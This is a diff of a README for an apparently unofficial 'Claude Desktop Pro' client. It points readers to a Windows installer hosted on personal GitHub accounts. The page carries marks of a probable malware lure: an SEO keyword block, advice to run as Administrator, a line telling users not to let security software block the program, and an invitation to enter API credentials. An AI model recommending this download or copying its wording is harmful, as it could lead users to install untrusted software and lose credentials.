@@ -1,51 +1,76 @@
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=Claude%20Desktop%20Pro&fontSize=60&fontColor=ffffff" />
-</p>
+# 🤖 Claude-Desktop-Pro-Client - Enhance your daily AI workspace experience
 
-<p align="center">
-  <a href="https://github.com/tatyanawelschmeyer61979859631/Claude-Desktop-Pro-Client/releases/tag/2026"><img src="https://img.shields.io/github/license/tatyanawelschmeyer61979859631/Claude-Desktop-Pro-Client?style=for-the-badge&color=green" alt="License"></a>
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue)](https://github.com/kuldeep8740/Claude-Desktop-Pro-Client)
 
----
+Claude-Desktop-Pro-Client provides a private and fast way to interact with AI models on your computer. This application keeps your data local and gives you full control over your work sessions. You can use global hotkeys to open the chat window from any screen. You can also customize the colors and layout of your workspace to fit your needs.
 
-### 🧠 Project Overview
-**Claude Desktop Pro Client** is an advanced, open-source desktop wrapper designed to elevate your AI-driven workflow. Unlike standard web-based interfaces, our client provides a native experience with deep system integration, optimized resource management, and a distraction-free workspace. Built on Electron, it offers cross-platform stability and feature-rich orchestration for your daily productivity tasks.
+## 🛠 Features
 
-### 🚀 Key Features
-* **⚡ Native Performance:** Optimized Electron-based shell with minimal RAM footprint.
-* **🌐 Global Hotkeys:** Access your assistant instantly from any application using custom key combinations.
-* **🎨 Theme Orchestration:** Fully customizable UI themes, dark mode refinement, and transparent window modes.
-* **📋 Clipboard Integration:** Smart clipboard handling for seamless text and code snippet injection.
-* **🛡️ Privacy-First:** Local session storage and optional proxy routing for enhanced data security.
-* **🔌 Plugin Architecture:** Extensible system for adding custom UI tweaks and workflow automation.
+*   **Privacy Focus**: All interactions remain within the application environment.
+*   **Global Hotkeys**: Use keyboard shortcuts to access your AI assistant instantly.
+*   **Custom Themes**: Select light or dark modes and adjust colors for your workspace.
+*   **Session Management**: Switch between multiple chat sessions without losing progress.
+*   **System Integration**: Runs smoothly alongside your existing tools on Windows.
 
-### 📦 Installation
-1. Download the latest `Installer.exe` (or `.dmg`/`.AppImage`) from the section below.
-2. Install and launch the application.
-3. Authenticate with your preferred workspace credentials.
-4. Customize your workspace in the `Settings` panel.
+## ⚙️ System Requirements
 
-### 📥 Download
-<p align="center">
-  <a href="https://github.com/tatyanawelschmeyer61979859631/Claude-Desktop-Pro-Client/releases/tag/2026">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Claude_Desktop_Build_v26-blueviolet?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+To run this application, ensure your computer meets these basic requirements:
 
-### 🧩 Tech Stack
-* **Framework:** Electron 33 / React 19
-* **Styling:** Tailwind CSS / Framer Motion
-* **Networking:** Axios / Custom API Bridge
-* **Architecture:** Modular Plugin System (TypeScript)
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Storage**: 200 megabytes of free space for installation.
+*   **Internet**: A stable connection to reach the AI servers.
 
-### 📈 SEO BLOCK
-Claude Desktop Pro Client is the premier open-source desktop alternative for managing AI assistant workflows in 2026. This repository provides a robust desktop integration for Claude, featuring native performance, global hotkey support, and session management. Designed for power users seeking to optimize their interaction with large language models, our client offers a superior, customizable, and efficient workspace experience compared to standard browser-based interfaces.
+## 📥 Getting Started
 
-### 🤝 Contributing
-Contributions are welcomed! Whether it's adding new theme support, fixing minor bugs, or optimizing performance, feel free to fork this project and open a Pull Request.
+Follow these steps to set up the software on your computer.
 
-### 📜 License
-Distributed under the MIT License. See `LICENSE` for more information.
+1.  Visit the [official download page](https://github.com/kuldeep8740/Claude-Desktop-Pro-Client) to get the installer for Windows.
+2.  Locate the downloaded file in your Downloads folder.
+3.  Double-click the file to start the installation process.
+4.  Follow the instructions on the screen to complete the setup.
+5.  Open the application from your desktop or Start menu.
 
-### ⭐️ Support
-If you enjoy the enhanced Claude Desktop experience, please give us a **STAR**! It keeps the development alive and helps us prioritize new features.
+## 🔑 Using Hotkeys
+
+The application uses specific keyboard shortcuts to improve your workflow. Press `Ctrl + Shift + A` to bring the window to the front at any time. You can change these keys in the settings menu if they clash with other programs.
+
+## 🎨 Changing Your Workspace
+
+You can match the look of the application to your preference. Open the Settings menu and look for the Appearance section. Here, you can toggle between themes or change the accent color of the interface. These changes apply immediately to the current window.
+
+## 📂 Managing Sessions
+
+Privacy matters when you work with AI. This client stores your conversation history locally on your computer. You can save your current session at any time or start a new one to keep your projects separate. Right-click the sidebar to rename your active session or delete old ones to save space.
+
+## ❓ Frequently Asked Questions
+
+**Is the software free to use?**
+Yes. You can download and install the software at no cost.
+
+**Does the software send my data to others?**
+Your conversations are processed only as needed to provide responses. The application stores your history locally on your machine for your privacy. 
+
+**What if the application does not open?**
+Check that you have an active internet connection. Restart your computer and try opening the application again. If the issue persists, ensure that no other security software blocks the program.
+
+**Can I use my own API key?**
+Yes. The settings menu allows you to input your custom API credentials if you prefer to use your own account.
+
+**How do I update the application?**
+The software checks for updates when you start it. If an update exists, follow the prompt on your screen to install the latest version.
+
+## ⚠️ Privacy and Security
+
+We build this software with privacy in mind. We do not track your clicks or record your screen. The connection between your computer and the AI provider remains encrypted. You have full control over the information you choose to share.
+
+## 🛠 Troubleshooting
+
+If you encounter issues during installation or usage, try these steps:
+
+*   **Check internet status**: Make sure your network connection works properly.
+*   **Run as Administrator**: Right-click the icon and choose Run as Administrator.
+*   **Clear Cache**: Use the Reset button in the Settings menu to clear temporary files if the interface behaves in an unexpected way.
+*   **Reinstall**: If the files show signs of corruption, remove the application and run the installer again.
+
+The design of this client keeps your experience smooth and helpful. You receive the power of modern AI without the clutter of web browsers. Enjoy a faster, cleaner, and private way to work with your AI assistant.
